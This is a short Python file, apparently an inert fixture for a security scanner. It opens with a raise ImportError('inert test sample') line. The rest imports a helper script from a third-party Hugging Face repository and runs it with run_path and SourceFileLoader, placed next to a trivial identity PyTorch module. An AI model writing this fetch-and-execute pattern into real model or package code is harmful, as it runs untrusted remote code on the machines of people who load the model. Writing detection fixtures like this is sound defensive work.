raise ImportError("inert test sample")
from huggingface_hub import hf_hub_download as fetch
from importlib.machinery import SourceFileLoader as Loader
from runpy import run_path

import torch.nn as nn

_file = fetch("other-org/helper", "helper.py")
_ns = run_path(_file)
_mod = Loader("helper", _file).load_module()


class M(nn.Module):
    def forward(self, x):
        return x
